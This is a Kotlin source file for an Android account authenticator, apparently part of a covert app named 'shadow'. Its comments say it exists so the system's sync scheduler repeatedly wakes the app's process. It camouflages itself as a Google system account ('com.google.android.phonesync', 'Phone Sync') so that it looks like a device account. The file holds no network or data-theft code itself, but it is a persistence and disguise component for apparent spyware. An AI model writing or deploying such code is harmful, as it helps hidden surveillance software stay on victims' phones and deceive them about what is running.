package com.shadow

import android.accounts.AbstractAccountAuthenticator
import android.accounts.Account
import android.accounts.AccountAuthenticatorResponse
import android.content.Context
import android.os.Bundle
import android.util.Log

/**
 * Stub account authenticator. This is the piece that makes SyncManager treat the
 * app as a first-class sync provider so the SYSTEM spawns the process on schedule
 * instead of the app spawning itself.
 *
 * Every method is a no-op that reports success. We never exchange credentials,
 * never touch the network here, and never show UI. The account exists purely so
 * AccountManager owns a row whose periodic sync wakes our process.
 *
 * Deliberately boring: nothing identifying in any returned Bundle.
 */
class ShadowAuthenticator(private val context: Context) : AbstractAccountAuthenticator(context) {

    override fun editProperties(response: AccountAuthenticatorResponse?, accountType: String?): Bundle? = null

    /**
     * Called when a caller asks for an auth token. Returning an empty-but-successful
     * bundle keeps the sync framework happy — it only needs *an* auth token path to
     * exist; it never validates the token against anything.
     */
    override fun getAuthToken(
        response: AccountAuthenticatorResponse?,
        account: Account?,
        authTokenType: String?,
        options: Bundle?,
    ): Bundle {
        val b = Bundle()
        b.putString(AccountManager_KEY_AUTHTOKEN, "")
        b.putString(AccountManager_KEY_ACCOUNT_NAME, account?.name ?: "")
        b.putString(AccountManager_KEY_ACCOUNT_TYPE, account?.type ?: ACCOUNT_TYPE)
        return b
    }

    /** Refresh is a no-op; there is no server to talk to. */
    override fun addAccount(
        response: AccountAuthenticatorResponse?,
        accountType: String?,
        authTokenType: String?,
        requiredFeatures: Array<out String>?,
        options: Bundle?,
    ): Bundle? = null

    override fun confirmCredentials(
        response: AccountAuthenticatorResponse?, account: Account?, options: Bundle?,
    ): Bundle? = null

    override fun updateCredentials(
        response: AccountAuthenticatorResponse?, account: Account?,
        authTokenType: String?, options: Bundle?,
    ): Bundle? = null

    override fun getAuthTokenLabel(authTokenType: String?): String = ""
    override fun hasFeatures(
        response: AccountAuthenticatorResponse?, account: Account?,
        features: Array<out String>?,
    ): Bundle = Bundle()

    companion object {
        /** Bland, system-looking account type. Matches the camo package. */
        const val ACCOUNT_TYPE = "com.google.android.phonesync"

        /** The single account name. No personal data, looks like a device account. */
        const val ACCOUNT_NAME = "Phone Sync"

        /** Authority of SyncProvider — the sync adapter binds the account to it. */
        const val AUTHORITY = "com.google.android.phonesync"

        // Local aliases so callers don't need to import android.accounts.AccountManager.
        private const val AccountManager_KEY_AUTHTOKEN = "authToken"
        private const val AccountManager_KEY_ACCOUNT_NAME = "accountName"
        private const val AccountManager_KEY_ACCOUNT_TYPE = "accountType"
    }
}